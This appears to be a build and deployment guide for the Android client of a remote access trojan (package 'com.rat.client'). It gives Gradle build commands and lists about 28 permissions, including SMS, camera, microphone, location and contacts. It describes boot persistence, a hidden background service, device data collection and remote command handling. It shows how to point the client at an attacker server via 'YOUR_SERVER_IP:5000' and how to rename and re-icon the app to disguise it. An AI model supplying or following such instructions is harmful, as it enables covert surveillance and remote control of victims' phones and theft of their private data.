# 📱 ANDROID APK BUILD GUIDE

## 🚀 QUICK START

### Method 1: Android Studio (Recommended)

1. **Install Android Studio**
   - Download: https://developer.android.com/studio
   - Install with default settings

2. **Open Project**
   ```
   File → Open → Select "android" folder
   ```

3. **Wait for Gradle Sync**
   - First time: 5-10 minutes
   - Downloads dependencies automatically

4. **Build APK**
   ```
   Build → Build Bundle(s) / APK(s) → Build APK(s)
   ```

5. **Locate APK**
   ```
   Click "locate" when build completes
   Path: android/app/build/outputs/apk/debug/app-debug.apk
   ```

---

### Method 2: Command Line (Fast)

**Windows:**
```bash
cd android
gradlew.bat assembleDebug
```

**Linux/Mac:**
```bash
cd android
./gradlew assembleDebug
```

**APK Location:**
```
android/app/build/outputs/apk/debug/app-debug.apk
```

---

## 📋 PERMISSIONS (30+ Permissions)

### Automatically Requested:
✅ Internet & Network (4)
✅ Camera (1)
✅ Microphone (1)
✅ Storage (3)
✅ Location (3)
✅ Phone (3)
✅ SMS (3)
✅ Contacts (2)
✅ System (7)
✅ Notifications (1)

### Total: 28 Permissions

---

## 🎯 FEATURES INCLUDED

✅ Real-time Socket.IO connection
✅ Auto-start on boot
✅ Background service (persistent)
✅ Permission auto-request
✅ Device info collection
✅ Command handling system
✅ Foreground service notification
✅ Network state monitoring

---

## 📲 INSTALLATION

1. **Transfer APK to Android device**
   - USB, Bluetooth, or Cloud

2. **Enable Unknown Sources**
   ```
   Settings → Security → Unknown Sources → Enable
   ```

3. **Install APK**
   - Tap APK file
   - Click "Install"
   - Grant all permissions

4. **App Auto-Starts**
   - Connects to server automatically
   - Runs in background
   - Shows in dashboard

---

## ⚙️ CONFIGURATION

**Change Server URL:**

Edit: `android/app/src/main/java/com/rat/client/BackgroundService.java`

```java
private String serverUrl = "http://YOUR_SERVER_IP:5000";
```

**Change App Name:**

Edit: `android/app/src/main/res/values/strings.xml`

```xml
<string name="app_name">Your App Name</string>
```

---

## 🔧 TROUBLESHOOTING

**Build Failed?**
- Update Android Studio
- Sync Gradle: File → Sync Project with Gradle Files
- Clean Build: Build → Clean Project

**APK Won't Install?**
- Enable Unknown Sources
- Check storage space
- Uninstall old version

**Device Not Connecting?**
- Check server URL
- Verify internet connection
- Check firewall settings

---

## 📊 TESTED ON

✅ Android 6.0+
✅ Android 7.0+
✅ Android 8.0+
✅ Android 9.0+
✅ Android 10+
✅ Android 11+
✅ Android 12+
✅ Android 13+
✅ Android 14+

---

## 🎨 CUSTOMIZE

**App Icon:**
- Replace files in: `android/app/src/main/res/mipmap-*/`
- Use icon generator: http://localhost:3000/icon-generator.html

**Package Name:**
- Edit: `android/app/build.gradle`
- Change: `applicationId "com.rat.client"`

---

## ✅ READY TO BUILD!

**Just run:**
```bash
cd android
gradlew.bat assembleDebug
```

**APK will be at:**
```
android/app/build/outputs/apk/debug/app-debug.apk
```

---

**🔥 COMPLETE ANDROID PROJECT READY!**
